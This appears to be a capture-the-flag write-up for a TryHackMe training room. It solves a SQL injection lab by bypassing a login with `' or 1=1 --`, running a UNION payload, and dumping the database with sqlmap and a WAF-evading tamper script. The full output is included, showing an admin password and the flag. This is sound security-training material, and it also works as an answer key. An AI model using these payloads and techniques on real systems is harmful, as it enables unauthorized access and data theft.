# Day 5 - Someone stole Santa's gift list! (Web Exploitation)

1. SQL Injection Resources:
    * [List of SQL Commands | Codecademy](https://www.codecademy.com/articles/sql-commands)
    * Cheat sheet: [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
    * Payload list: [payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)
    * In-depth SQL Injection tutorial: [SQLi Basics](https://tryhackme.com/room/sqlibasics)

2. Without using directory brute forcing, what's Santa's secret login panel? `/santapanel`

3. Visit Santa's secret login panel and bypass the login using SQLi

    1. Visit `http://10.10.43.99:8000/santapanel`

    2. Login with `' or 1=1 --` for username and password.

4. How many entries are there in the gift database? Run `' UNION SELECT NULL,NULL--` to dump the table. There are `22` entries in the gift database.

    | Gift                       | Child       |
    |----------------------------|-------------|
    | None                       | None        |
    | 10 McDonalds meals         | Thomas      |
    | TryHackMe Sub              | Kenneth     |
    | air hockey table           | Christopher |
    | bike                       | Matthew     |
    | books                      | Richard     |
    | candy                      | David       |
    | chair                      | Joshua      |
    | fazer chocolate            | Donald      |
    | finnish-english dictionary | James       |
    | github ownership           | Paul        |
    | iphone                     | Robert      |
    | laptop                     | Steven      |
    | lego star wars             | Daniel      |
    | playstation                | Michael     |
    | rasberry pie               | Andrew      |
    | shoes                      | James       |
    | skateboard                 | John        |
    | socks                      | Joseph      |
    | table tennis               | Anthony     |
    | toy car                    | Charles     |
    | wii                        | Mark        |
    | xbox                       | William     |

5. What did Paul ask for? `github ownership`

6. What is the flag?

    1. Can't just use `sqlmap` ([sqlmap cheat sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)) by itself because there is a cookie sent in the request. So lets save the request using Burp Suite ([Setup Guide with Foxy Proxy](https://null-byte.wonderhowto.com/how-to/use-burp-foxyproxy-easily-switch-between-proxy-settings-0196630/)). Intercept a search request, right click it, and choose a save location.

    2. Run `sqlmap -r request --dump-all --dbms sqlite --tamper=space2comment`. Using `--tamper=space2comment` since the instructions state there is a Web Application Firewall (WAF). `--dump-all` will dump the entire database and `--dbms sqlite` says we known the database is `sqlite`, which was said in the instructions.

    3. When asked if you want to reduce the number of requests, specify `no`.

    4. `sqlmap` output:

        ```
        [*] starting @ 23:17:45 /2020-12-05/

        [23:17:45] [INFO] parsing HTTP request from 'request'
        [23:17:45] [INFO] loading tamper module 'space2comment'
        [23:17:45] [WARNING] provided value for parameter 'search' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
        [23:17:45] [INFO] testing connection to the target URL
        [23:17:45] [INFO] testing if the target URL content is stable
        [23:17:46] [INFO] target URL content is stable
        [23:17:46] [INFO] testing if GET parameter 'search' is dynamic
        [23:17:46] [INFO] GET parameter 'search' appears to be dynamic
        [23:17:46] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
        [23:17:46] [INFO] testing for SQL injection on GET parameter 'search'
        [23:17:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
        [23:17:47] [WARNING] reflective value(s) found and filtering out
        [23:17:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
        [23:17:49] [INFO] testing 'Generic inline queries'
        it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
        [23:17:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
        [23:18:02] [INFO] target URL appears to be UNION injectable with 2 columns
        [23:18:02] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
        [23:18:02] [INFO] checking if the injection point on GET parameter 'search' is a false positive
        [23:18:04] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
        GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
        sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
        ---
        Parameter: search (GET)
            Type: UNION query
            Title: Generic UNION query (NULL) - 2 columns
            Payload: search=' UNION ALL SELECT NULL,'qpqvq'||'eFmzMHnCSwNyihzOtpHDLXxRTWoeLPybiiwmpJNW'||'qvxqq'-- IdjF
        ---
        [23:18:10] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
        [23:18:10] [INFO] testing SQLite
        [23:18:10] [INFO] confirming SQLite
        [23:18:10] [INFO] actively fingerprinting SQLite
        [23:18:10] [INFO] the back-end DBMS is SQLite
        back-end DBMS: SQLite
        [23:18:10] [INFO] sqlmap will dump entries of all tables from all databases now
        [23:18:10] [INFO] fetching tables for database: 'SQLite_masterdb'
        [23:18:10] [INFO] fetching columns for table 'users' in database 'SQLite_masterdb'
        [23:18:10] [INFO] fetching entries for table 'users' in database 'SQLite_masterdb'
        Database: SQLite_masterdb
        Table: users
        [1 entry]
        +------------------+----------+
        | password         | username |
        +------------------+----------+
        | EhCNSWzzFP6sc7gB | admin    |
        +------------------+----------+

        [23:18:11] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.sqlmap/output/10.10.43.99/dump/SQLite_masterdb/users.csv'                                                                                                                         
        [23:18:11] [INFO] fetching columns for table 'hidden_table' in database 'SQLite_masterdb'
        [23:18:11] [INFO] fetching entries for table 'hidden_table' in database 'SQLite_masterdb'
        Database: SQLite_masterdb
        Table: hidden_table
        [1 entry]
        +-----------------------------------------+
        | flag                                    |
        +-----------------------------------------+
        | thmfox{All_I_Want_for_Christmas_Is_You} |
        +-----------------------------------------+

        [23:18:11] [INFO] table 'SQLite_masterdb.hidden_table' dumped to CSV file '/home/kali/.sqlmap/output/10.10.43.99/dump/SQLite_masterdb/hidden_table.csv'                                                                                                           
        [23:18:11] [INFO] fetching columns for table 'sequels' in database 'SQLite_masterdb'
        [23:18:11] [INFO] fetching entries for table 'sequels' in database 'SQLite_masterdb'
        Database: SQLite_masterdb
        Table: sequels
        [22 entries]
        +-------------+-----+----------------------------+
        | kid         | age | title                      |
        +-------------+-----+----------------------------+
        | James       | 8   | shoes                      |
        | John        | 4   | skateboard                 |
        | Robert      | 17  | iphone                     |
        | Michael     | 5   | playstation                |
        | William     | 6   | xbox                       |
        | David       | 6   | candy                      |
        | Richard     | 9   | books                      |
        | Joseph      | 7   | socks                      |
        | Thomas      | 10  | 10 McDonalds meals         |
        | Charles     | 3   | toy car                    |
        | Christopher | 8   | air hockey table           |
        | Daniel      | 12  | lego star wars             |
        | Matthew     | 15  | bike                       |
        | Anthony     | 3   | table tennis               |
        | Donald      | 4   | fazer chocolate            |
        | Mark        | 17  | wii                        |
        | Paul        | 9   | github ownership           |
        | James       | 8   | finnish-english dictionary |
        | Steven      | 11  | laptop                     |
        | Andrew      | 16  | rasberry pie               |
        | Kenneth     | 19  | TryHackMe Sub              |
        | Joshua      | 12  | chair                      |
        +-------------+-----+----------------------------+

        [23:18:11] [INFO] table 'SQLite_masterdb.sequels' dumped to CSV file '/home/kali/.sqlmap/output/10.10.43.99/dump/SQLite_masterdb/sequels.csv'                                                                                                                     
        [23:18:11] [WARNING] HTTP error codes detected during run:
        400 (Bad Request) - 1 times
        [23:18:11] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/10.10.43.99'

        [*] ending @ 23:18:11 /2020-12-05/
        ```

    5. The flag is `thmfox{All_I_Want_for_Christmas_Is_You}`.

7. What is admin's password? `EhCNSWzzFP6sc7gB`.
